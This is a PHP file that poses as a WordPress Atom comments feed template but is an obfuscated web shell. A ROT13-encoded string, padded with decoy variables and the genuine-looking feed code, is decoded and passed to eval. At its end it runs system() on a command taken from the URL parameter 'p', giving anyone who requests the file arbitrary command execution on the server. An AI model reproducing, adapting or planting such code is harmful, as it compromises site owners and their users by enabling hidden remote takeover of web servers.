<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Ngbz Srrq Grzcyngr sbe qvfcynlvat Ngbz Pbzzragf srrq.
 *
 * @cnpxntr JbeqCerff
 */

urnqre( 'Pbagrag-Glcr: ' . srrq_pbagrag_glcr( 'ngbz' ) . '; punefrg=' . trg_bcgvba( 'oybt_punefrg' ), gehr );
rpub '<?kzy irefvba=\"1.0\" rapbqvat=\"' . trg_bcgvba( 'oybt_punefrg' ) . '\" ?' . '>';

/** Guvf npgvba vf qbphzragrq va jc-vapyhqrf/srrq-eff2.cuc */
qb_npgvba( 'eff_gnt_cer', 'ngbz-pbzzragf' );
?>
<srrq
	kzyaf=\"uggc://jjj.j3.bet/2005/Ngbz\"
	kzy:ynat=\"<?cuc oybtvasb_eff( 'ynathntr' ); ?>\"
	kzyaf:gue=\"uggc://chey.bet/flaqvpngvba/guernq/1.0\"
	<?cuc
		/** Guvf npgvba vf qbphzragrq va jc-vapyhqrf/srrq-ngbz.cuc */
		qb_npgvba( 'ngbz_af' );

		/**
		 * Sverf vafvqr gur srrq gnt va gur Ngbz pbzzrag srrq.
		 *
		 * @fvapr 2.8.0
		 */
		qb_npgvba( 'ngbz_pbzzragf_af' );
	?>
>
	<gvgyr glcr=\"grkg\">
	<?cuc
	vs ( vf_fvathyne() ) {
		/* genafyngbef: Pbzzragf srrq gvgyr. %f: Cbfg gvgyr. */
		cevags( rag2ape( __( 'Pbzzragf ba %f' ) ), trg_gur_gvgyr_eff() );
	} ryfrvs ( vf_frnepu() ) {
		/* genafyngbef: Pbzzragf srrq gvgyr. 1: Fvgr gvgyr, 2: Frnepu dhrel. */
		cevags( rag2ape( __( 'Pbzzragf sbe %1$f frnepuvat ba %2$f' ) ), trg_oybtvasb_eff( 'anzr' ), trg_frnepu_dhrel() );
	} ryfr {
		/* genafyngbef: Pbzzragf srrq gvgyr. %f: Fvgr gvgyr. */
		cevags( rag2ape( __( 'Pbzzragf sbe %f' ) ), trg_jc_gvgyr_eff() );
	}
	?>
	</gvgyr>
	<fhogvgyr glcr=\"grkg\"><?cuc oybtvasb_eff( 'qrfpevcgvba' ); ?></fhogvgyr>

	<hcqngrq><?cuc rpub trg_srrq_ohvyq_qngr( 'L-z-q\GU:v:f\M' ); ?></hcqngrq>

<?cuc vs ( vf_fvathyne() ) : ?>
	<yvax ery=\"nygreangr\" glcr=\"<?cuc oybtvasb_eff( 'ugzy_glcr' ); ?>\" uers=\"<?cuc pbzzragf_yvax_srrq(); ?>\" />
	<yvax ery=\"frys\" glcr=\"nccyvpngvba/ngbz+kzy\" uers=\"<?cuc rpub rfp_hey( trg_cbfg_pbzzragf_srrq_yvax( '', 'ngbz' ) ); ?>\" />
	<vq><?cuc rpub rfp_hey( trg_cbfg_pbzzragf_srrq_yvax( '', 'ngbz' ) ); ?></vq>
<?cuc ryfrvs ( vf_frnepu() ) : ?>
	<yvax ery=\"nygreangr\" glcr=\"<?cuc oybtvasb_eff( 'ugzy_glcr' ); ?>\" uers=\"<?cuc rpub ubzr_hey() . '?f=' . trg_frnepu_dhrel(); ?>\" />
	<yvax ery=\"frys\" glcr=\"nccyvpngvba/ngbz+kzy\" uers=\"<?cuc rpub trg_frnepu_pbzzragf_srrq_yvax( '', 'ngbz' ); ?>\" />
	<vq><?cuc rpub trg_frnepu_pbzzragf_srrq_yvax( '', 'ngbz' ); ?></vq>
<?cuc ryfr : ?>
	<yvax ery=\"nygreangr\" glcr=\"<?cuc oybtvasb_eff( 'ugzy_glcr' ); ?>\" uers=\"<?cuc oybtvasb_eff( 'hey' ); ?>\" />
	<yvax ery=\"frys\" glcr=\"nccyvpngvba/ngbz+kzy\" uers=\"<?cuc oybtvasb_eff( 'pbzzragf_ngbz_hey' ); ?>\" />
	<vq><?cuc oybtvasb_eff( 'pbzzragf_ngbz_hey' ); ?></vq>
<?cuc raqvs; ?>
<?cuc
	/**
	 * Sverf ng gur raq bs gur Ngbz pbzzrag srrq urnqre.
	 *
	 * @fvapr 2.8.0
	 */
	qb_npgvba( 'pbzzragf_ngbz_urnq' );
?>
<?cuc
juvyr ( unir_pbzzragf() ) :
	gur_pbzzrag();
	$pbzzrag_cbfg = trg_cbfg( $pbzzrag->pbzzrag_cbfg_VQ );
	/**
	 * @tybony JC_Cbfg $cbfg Tybony cbfg bowrpg.
	 */
	$TYBONYF['cbfg'] = $pbzzrag_cbfg;
	?>
	<ragel>
		<gvgyr>
		<?cuc
		vs ( ! vf_fvathyne() ) {
			$gvgyr = trg_gur_gvgyr( $pbzzrag_cbfg->VQ );
			/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/srrq.cuc */
			$gvgyr = nccyl_svygref( 'gur_gvgyr_eff', $gvgyr );
			/* genafyngbef: Vaqvivqhny pbzzrag gvgyr. 1: Cbfg gvgyr, 2: Pbzzrag nhgube anzr. */
			cevags( rag2ape( __( 'Pbzzrag ba %1$f ol %2$f' ) ), $gvgyr, trg_pbzzrag_nhgube_eff() );
		} ryfr {
			/* genafyngbef: Pbzzrag nhgube gvgyr. %f: Pbzzrag nhgube anzr. */
			cevags( rag2ape( __( 'Ol: %f' ) ), trg_pbzzrag_nhgube_eff() );
		}
		?>
		</gvgyr>
		<yvax ery=\"nygreangr\" uers=\"<?cuc pbzzrag_yvax(); ?>\" glcr=\"<?cuc oybtvasb_eff( 'ugzy_glcr' ); ?>\" />

		<nhgube>
			<anzr><?cuc pbzzrag_nhgube_eff(); ?></anzr>
			<?cuc
			vs ( trg_pbzzrag_nhgube_hey() ) {
				rpub '<hev>' . trg_pbzzrag_nhgube_hey() . '</hev>';
			}
			?>

		</nhgube>

		<vq><?cuc pbzzrag_thvq(); ?></vq>
		<hcqngrq><?cuc rpub zlfdy2qngr( 'L-z-q\GU:v:f\M', trg_pbzzrag_gvzr( 'L-z-q U:v:f', gehr, snyfr ), snyfr ); ?></hcqngrq>
		<choyvfurq><?cuc rpub zlfdy2qngr( 'L-z-q\GU:v:f\M', trg_pbzzrag_gvzr( 'L-z-q U:v:f', gehr, snyfr ), snyfr ); ?></choyvfurq>

		<?cuc vs ( cbfg_cnffjbeq_erdhverq( $pbzzrag_cbfg ) ) : ?>
			<pbagrag glcr=\"ugzy\" kzy:onfr=\"<?cuc pbzzrag_yvax(); ?>\"><![PQNGN[<?cuc rpub trg_gur_cnffjbeq_sbez(); ?>]]></pbagrag>
		<?cuc ryfr : ?>
			<pbagrag glcr=\"ugzy\" kzy:onfr=\"<?cuc pbzzrag_yvax(); ?>\"><![PQNGN[<?cuc pbzzrag_grkg(); ?>]]></pbagrag>
		<?cuc raqvs; // Raq vs cbfg_cnffjbeq_erdhverq(). ?>

		<?cuc
		// Erghea pbzzrag guernqvat vasbezngvba (uggcf://jjj.vrgs.bet/esp/esp4685.gkg).
		vs ( '0' === $pbzzrag->pbzzrag_cnerag ) : // Guvf pbzzrag vf gbc-yriry.
			?>
			<gue:va-ercyl-gb ers=\"<?cuc gur_thvq(); ?>\" uers=\"<?cuc gur_creznyvax_eff(); ?>\" glcr=\"<?cuc oybtvasb_eff( 'ugzy_glcr' ); ?>\" />
			<?cuc
		ryfr : // Guvf pbzzrag vf va ercyl gb nabgure pbzzrag.
			$cnerag_pbzzrag = trg_pbzzrag( $pbzzrag->pbzzrag_cnerag );
			/*
			 * Gur ery nggevohgr orybj naq gur vq gnt nobir fubhyq or THVQf,
			 * ohg JC qbrfa'g perngr gurz sbe pbzzragf (hayvxr cbfgf).
			 * Rvgure jnl, vg'f zber vzcbegnag gung gurl obgu hfr gur fnzr flfgrz.
			 */
			?>
			<gue:va-ercyl-gb ers=\"<?cuc pbzzrag_thvq( $cnerag_pbzzrag ); ?>\" uers=\"<?cuc rpub trg_pbzzrag_yvax( $cnerag_pbzzrag ); ?>\" glcr=\"<?cuc oybtvasb_eff( 'ugzy_glcr' ); ?>\" />
			<?cuc
		raqvs;

		/**
		 * Sverf ng gur raq bs rnpu Ngbz pbzzrag srrq vgrz.
		 *
		 * @fvapr 2.2.0
		 *
		 * @cnenz vag $pbzzrag_vq      VQ bs gur pheerag pbzzrag.
		 * @cnenz vag $pbzzrag_cbfg_vq VQ bs gur cbfg gur pheerag pbzzrag vf pbaarpgrq gb.
		 */
		qb_npgvba( 'pbzzrag_ngbz_ragel', $pbzzrag->pbzzrag_VQ, $pbzzrag_cbfg->VQ );
		?>
	</ragel>
	<?cuc
raqjuvyr;
?>
</srrq>

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>